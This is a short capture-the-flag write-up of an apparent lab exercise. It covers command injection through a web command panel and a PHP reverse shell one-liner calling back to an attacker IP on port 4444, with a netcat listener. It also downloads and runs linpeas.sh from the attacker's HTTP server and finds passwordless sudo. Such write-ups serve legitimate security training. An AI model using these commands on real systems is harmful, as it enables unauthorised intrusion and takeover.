## Exploit
Command Panel is vulnerable and allowing to use commands to get information. I used "ls -a" to list all files including hidden files and found Sup3rS3cretPickl3Ingred.txt. I was able to get the first ingredient by running - ``` grep . -R ```

## Reverse Shell
- set Terminal to listen - ``` nc -nvlp 4444 ```
- Executed PHP reverse shell and gained access: 
```
php -r '$sock=fsockopen("10.6.41.41",4444);exec("/bin/sh -i <&3 >&3 2>&3");â€™
```
Cheatsheet - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Navigate to /home > ``` grep . -R ``` to get second ingredient.

## Post-Exploit (LinPEAS)
- Opened new tab in the terminal and ran - ``` python3 -m http.server 8000 ```
- ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
- ``` chmod +x /tmp/linpeas.sh ```
- ``` /tmp/linpeas.sh ```
Results from LinePEAS - User www-data may run the following commands on ip-10-10-191-16:
(ALL) NOPASSWD: ALL
This means that you can run any command as scriptmanager, and optionally set your group to scriptmanager when doing so
